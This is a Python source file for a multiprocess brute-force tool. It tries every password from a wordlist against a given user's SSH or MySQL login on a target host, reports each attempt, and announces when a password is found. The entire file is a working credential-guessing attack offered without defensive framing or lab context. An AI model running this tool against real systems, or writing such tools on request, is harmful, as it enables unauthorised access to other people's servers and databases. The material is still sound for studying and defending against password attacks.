import multiprocessing as mp
from multiprocessing import Value, Lock
import paramiko
import time
import optparse
import mysql.connector
import logging

class ConnectionTools:

    def __init__(self, user, host, port, protocol, num_process, password_file):
        self.user = user
        self.host = host
        self.port = port
        self.protocol = protocol
        self.num_process = num_process 
        self.password_list = self.file2list(password_file)
        self.index = 0


    def print_attack(self):
        print("===================================================")
        print("===================================================")
        print("Launching a brute force attack on")
        print("User: " + str(self.user))
        print("Host: " + str(self.host))
        print("port: " + str(self.port))
        print("protocol: " +str(self.protocol))
        print("===================================================")

    def reset_index(self):
        self.index = 0

    def set_protocol(self, protocol):
        self.protocol = protocol

    def set_port(self, port):
        self.port = port

    def mysql_connection(self, password, queue, index, found_password):
        print('Testing password: ' + password + "\t\t #" + str(index.value))
        index.value += 1
        try:
            cnx = mysql.connector.connect(user=self.user, password=password,\
                    host=self.host, port=self.port)
            self.good_password = str(password)
            print("we found the password " + str(password))
            queue.put(password)
            found_password.value=password
            return True

        except:
            return False


    def ssh_connection(self, password, queue, index, found_password):
        print('Testing password: ' + password + "\t\t #" + str(index.value))
        index.value += 1
        try :
            self.connection.connect(self.host, username=self.user, password=password)
            self.good_password = str(password)
            print("we found the password " + str(password))
            queue.put(password)
            found_password.value=password
            return True
    
        except paramiko.ssh_exception.AuthenticationException as e :
            return False
    
        except paramiko.ssh_exception.NoValidConnectionsError as e :
            return False
    

    def file2list(self, file_to_convert):
        with open(file_to_convert,'r') as file_list:
            #get the password file into a list, removing \n characteres
           password_list = [i.strip() for i in file_list.readlines()]
           return password_list 

    def run(self):

        if self.protocol == "mysql":

            #setting the method to call for this protocol
            self.caller = self.mysql_connection

        if self.protocol=="ssh":

            #creating the ssh connection object
            self.connection = paramiko.SSHClient()

            #this is to add new host automatically
            self.connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            #setting the method to call for this protocol
            self.caller = self.ssh_connection

        manager = mp.Manager()
        #Create a value to store the final password if found
        found_password=manager.Value('s','') 

        #Create a value that can be shared between processes
        index=manager.Value('i',0) 

        #Create a value to store the final password if found
        found_password=manager.Value('s','') 

        #This is needed to retrieve the final password

        queue = manager.Queue() 
        temp_password_list=[] #buffer to feed the proecesses with passw
        process_list=[]       #to store multi-process objects

        while self.password_list:
            #retrieve the num_processes first passwords
            temp_password_list = self.password_list[:int(self.num_process)]

            #storing all the multiprocess obj in a list
            #size of the self.password_list has to be taken into account
            for i in range(0,min(int(self.num_process), len(self.password_list))):
                process_list.append(mp.Process(target=self.caller,\
                        args=(temp_password_list[i],queue, index, found_password)))
                process_list[-1].start()

            #joining the processes
            for i in range(0,len(process_list)):
                process_list[i].join()

            #reset the list to feed to the process and update the password list
            del self.password_list[:int(self.num_process)]
            process_list =[]

            #if the password has been found
            if queue.qsize()>=1:
                print("Oh yeah baby, we found it! The password is " + str(found_password.value))
                break 

            if len(self.password_list)==0:
                print("Sorry, the password could not be found!")

        print("We are done here!")    
